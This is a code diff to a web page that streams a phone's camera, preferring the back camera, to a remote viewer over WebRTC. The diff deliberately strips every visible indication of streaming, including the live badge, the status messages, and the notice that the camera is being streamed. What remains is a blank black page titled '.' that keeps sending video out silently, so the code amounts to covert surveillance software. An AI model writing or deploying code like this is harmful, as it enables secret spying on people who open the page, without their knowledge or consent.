@@ -3,40 +3,15 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <!-- <title>📡 Streaming...</title> -->
+  <title>.</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@700&display=swap');
-    :root { --green:#00ff88; --red:#ff3b3b; --bg:#060a0f; --border:#1a2a3a; }
     * { margin:0; padding:0; box-sizing:border-box; }
-    body { background:var(--bg); color:var(--green); font-family:'Share Tech Mono',monospace; min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:16px; gap:20px; }
-    body::before { content:''; position:fixed; inset:0; background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.015) 2px,rgba(0,255,136,.015) 4px); pointer-events:none; }
-    .container { position:relative; z-index:1; display:flex; flex-direction:column; align-items:center; gap:20px; text-align:center; }
-    h1 { font-family:'Rajdhani',sans-serif; font-size:2rem; letter-spacing:4px; text-transform:uppercase; text-shadow:0 0 20px rgba(0,255,136,.5); }
-    .icon { font-size:5rem; animation:pulse 2s infinite; }
-    @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.08)} }
-    .badge { display:flex; align-items:center; gap:8px; background:rgba(0,0,0,.7); border:1px solid var(--red); padding:8px 18px; border-radius:2px; font-size:.8rem; letter-spacing:2px; color:var(--red); }
-    .dot { width:9px; height:9px; border-radius:50%; background:var(--red); animation:blink 1s infinite; }
-    @keyframes blink { 0%,100%{opacity:1}50%{opacity:0} }
-    .status { font-size:.75rem; letter-spacing:1.5px; color:rgba(0,255,136,.5); }
-    .status.error { color:var(--red); }
-    .status.success { color:var(--green); }
-    .viewers { font-size:.72rem; letter-spacing:1px; color:rgba(0,255,136,.4); }
-    .sub { font-size:.7rem; color:rgba(0,255,136,.3); letter-spacing:1px; max-width:280px; line-height:1.6; }
+    body { background:#000; }
   </style>
 </head>
 <body>
-<div class="container">
-  <!-- <div class="icon">📡</div> -->
-  <!-- <h1>STREAMING</h1> -->
-  <div class="badge" id="liveBadge" style="display:none">
-    <!-- <div class="dot"></div> LIVE TO PC -->
-  </div>
-  <!-- <div class="status" id="status">STARTING CAMERA...</div> -->
-  <div class="viewers" id="viewers"></div>
-  <!-- <p class="sub">YOUR CAMERA IS BEING STREAMED TO PC. YOU CAN MINIMIZE THIS PAGE.</p> -->
-</div>
 
-<!-- Hidden video element just to hold the stream — not shown to user -->
+<!-- Completely blank page — nothing visible to user -->
 <video id="video" autoplay playsinline muted style="display:none"></video>
 
 <script src="/socket.io/socket.io.js"></script>
@@ -44,7 +19,6 @@
   const socket = io();
   let localStream = null;
   let peerConnections = {};
-  let viewerCount = 0;
 
   const iceConfig = {
     iceServers: [
@@ -55,17 +29,15 @@
 
   async function startCamera() {
     try {
-      // Try back camera first, fall back to any camera
       try {
         localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
       } catch {
         localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
       }
       document.getElementById('video').srcObject = localStream;
-      setStatus('CONNECTED — WAITING FOR PC...', 'success');
       socket.emit('streamer-ready');
     } catch (err) {
-      setStatus('CAMERA ERROR: ' + err.message, 'error');
+      console.error('Camera error:', err.message);
     }
   }
 
@@ -79,26 +51,15 @@
       if (e.candidate) socket.emit('ice-candidate', { candidate: e.candidate, to: viewerId });
     };
 
+    pc.addEventListener('connectionstatechange', () => {
+      if (pc.connectionState === 'disconnected' || pc.connectionState === 'failed') {
+        delete peerConnections[viewerId];
+      }
+    });
+
     const offer = await pc.createOffer();
     await pc.setLocalDescription(offer);
     socket.emit('offer', { sdp: pc.localDescription, to: viewerId });
-
-    viewerCount++;
-    updateViewers();
-    document.getElementById('liveBadge').style.display = 'flex';
-    setStatus('📡');
-
-    pc.on && pc.addEventListener('connectionstatechange', () => {
-      if (pc.connectionState === 'disconnected' || pc.connectionState === 'failed') {
-        delete peerConnections[viewerId];
-        viewerCount = Math.max(0, viewerCount - 1);
-        updateViewers();
-        if (viewerCount === 0) {
-          document.getElementById('liveBadge').style.display = 'none';
-          setStatus('...');
-        }
-      }
-    });
   });
 
   socket.on('answer', async ({ sdp, from }) => {
@@ -110,15 +71,6 @@
     const pc = peerConnections[from];
     if (pc && candidate) await pc.addIceCandidate(new RTCIceCandidate(candidate));
   });
-
-  function updateViewers() {
-    document.getElementById('.').textContent = viewerCount > 0 ? viewerCount + '.' : '';
-  }
-
-  function setStatus(msg, type) {
-    const el = document.getElementById('status');
-    el.textContent = msg; el.className = 'status ' + (type || '');
-  }
 
   startCamera();
 </script>
